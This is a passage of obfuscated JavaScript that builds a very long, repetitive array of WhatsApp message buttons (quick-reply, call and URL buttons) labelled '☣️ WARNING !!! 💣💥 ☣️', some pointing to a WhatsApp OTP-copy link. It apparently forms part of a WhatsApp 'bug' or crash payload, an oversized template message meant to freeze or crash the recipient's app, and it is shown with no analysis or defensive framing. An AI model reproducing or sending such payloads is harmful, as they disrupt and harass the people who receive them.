'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a